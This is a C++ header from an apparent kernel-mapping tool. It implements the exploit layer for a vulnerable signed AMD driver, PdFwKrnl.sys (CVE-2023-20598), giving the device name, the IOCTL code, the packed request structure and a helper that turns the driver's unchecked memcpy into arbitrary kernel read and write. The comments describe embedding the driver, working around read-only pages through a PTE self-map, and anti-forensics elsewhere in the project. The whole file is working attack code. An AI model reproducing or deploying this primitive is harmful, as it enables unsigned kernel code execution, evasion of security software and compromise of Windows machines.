#pragma once

#include <Windows.h>
#include <cstdint>

/*
 * The vulnerable driver that provides the kernel read/write primitive.
 *
 * A "provider" is a legitimately signed third-party driver with a hole that
 * gives arbitrary kernel memory access. Everything above this layer (mapping,
 * relocations, imports, kernel calls, anti-forensics) is provider independent;
 * only the device name and the memcpy IOCTL below differ.
 *
 * The embedded driver resource (Resource.hpp) MUST contain the .sys binary of
 * this provider, otherwise loading it will fail.
 *
 *  AMD PdFwKrnl.sys - AMD USB-C Power Delivery Firmware Update Utility driver,
 *  CVE-2023-20598. Ships with AMD Radeon Software up to and including 23.9.1.
 *  Device: \Device\PdFwKrnl  IOCTL: 0x80002014
 *
 * The request carries raw source/destination virtual addresses that the driver
 * memcpy's without validation, so it is a direct virtual read/write. It cannot
 * write to read-only pages, which is handled through the PTE self-map in
 * Driver.cpp.
 */

namespace Provider
{
	//Device path opened with CreateFileW. "\\.\PdFwKrnl" resolves to the
	//kernel device \Device\PdFwKrnl.
	constexpr const wchar_t* kDeviceName = L"\\\\.\\PdFwKrnl";

	//Human readable name, used only in log output.
	constexpr const wchar_t* kShortName = L"AMD PdFwKrnl";

	//The IOCTL that performs the unchecked copy.
	constexpr ULONG32 kCopyIoctl = 0x80002014;

	// Upper bound on a single provider copy, enforced in user mode.
	// The kernel handler is inside the embedded PdFwKrnl binary and
	// performs no validation of its own; this constant is the only
	// bound the caller can enforce. Sized so that the largest single
	// legitimately-needed copy (one page-table install for the PTE
	// self-map) fits comfortably inside.
	constexpr ULONG32 kMaxCopySize = 0x10000000; // 256 MB

	/*
	 * Layout of the IOCTL input buffer.
	 *
	 * The driver validates the size of this buffer but not the pointers inside
	 * it, which is the bug: it is handed an arbitrary read or write.
	 *
	 * Packed because the driver indexes the fields by byte offset. The three
	 * reserved fields are not reserved by us - they are expected to be zero
	 * and are passed through untouched.
	 */
#pragma pack(push, 1)
	struct CopyRequest {
		BYTE Reserved[16];
		PVOID Destination;
		PVOID Source;
		PVOID Reserved2;
		DWORD Size;
		DWORD Reserved3;
	};
#pragma pack(pop)

	//Fill a CopyRequest with the three values that matter.
	//This is the whole provider abstraction: MemCopy in Driver.cpp calls this
	//and issues the IOCTL, and every other memory helper in the project is
	//built on top of it.
	inline void FillCopyRequest(CopyRequest& request, uint64_t destination, uint64_t source, uint64_t length) {
		request = CopyRequest{};
		request.Destination = (PVOID)destination;
		request.Source = (PVOID)source;
		request.Size = (DWORD)length;
	}
}